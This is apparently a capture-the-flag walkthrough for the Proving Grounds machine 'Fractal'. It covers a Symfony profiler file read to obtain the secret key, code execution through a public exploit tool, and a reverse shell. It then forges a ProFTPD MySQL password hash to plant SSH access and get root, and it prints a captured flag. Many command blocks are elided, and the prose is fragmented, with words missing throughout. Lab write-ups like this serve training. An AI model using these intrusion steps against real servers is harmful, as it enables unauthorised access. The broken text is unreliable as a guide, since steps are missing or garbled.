###### tags: `Offsec` `PG Practice` `Easy` `Linux` # Fractal
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Check`http://192.168.244.233/app_dev.php`,200Clicklog in ![Fractal_1.png](picture/Fractal_1.png) Refer to[Multiple Vulnerabilities in Symfony profiler
](https://rahadchowdhury.medium.com/how-to-find-multiple-vulnerabilities-in-symfony-profiler-debug-mode-ccf2c5c7bb9f),Go to `http://192.168.244.233/app_dev.php/_profiler/open?file=app/config/parameters.yml`can ```
...
``` get `secret key`,use[symfony-exploits](https://github.com/ambionics/symfony-exploits/tree/main)(Firstten)
```
┌──(kali㉿kali)-[~]
...
``` canCheck`phpinfo()`,use`system()+id`
```
┌──(kali㉿kali)-[~/pgplay/symfony-exploits]
...
```
![Fractal_2.png](picture/Fractal_2.png) canusereverse shell
```
┌──(kali㉿kali)-[~/pgplay]
...
``` wait for reverse shell,`/home/benoit`local.txt
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@fractal:/home/benoit$ cat local.txt
5c9d765d75db7576fcf43f0097cb9ff7
``` Search[proftpd root Privilege Escalation](https://www.tenable.com/plugins/nnm/1817),`/etc/proftpd.conf`,`/etc/proftpd`
```
...
...
``` canuse`proftpd/protfpd_with_MYSQL_password`logindb,then use ffufphpmyadmin loginphpmyadmin,canproftpdCheck
```
...
+----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
``` Refer to[How To Set Up ProFTPD with a MySQL Backend on Ubuntu](https://medium.com/@nico26deo/how-to-set-up-proftpd-with-a-mysql-backend-on-ubuntu-c6f23a638caf) ```
┌──(kali㉿kali)-[~/pgplay]
└─$ /bin/echo "{md5}"`/bin/echo -n "password" | openssl dgst -binary -md5 | openssl enc -base64`
{md5}X03MO1qnZdYdgyfeuILPmQ==
``` phpmyadmin,`uid`,`gid`,`homedir`,`shell` ![Fractal_3.png](picture/Fractal_3.png) loginftp,Create.sshdirectory
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ftp 192.168.244.233
...
# home directory is set to /home/benoit
ftp> ls 
...
``` log incansshlogin,`benoit`login,/rootpathproof.txt
```
┌──(kali㉿kali)-[~/pgplay]
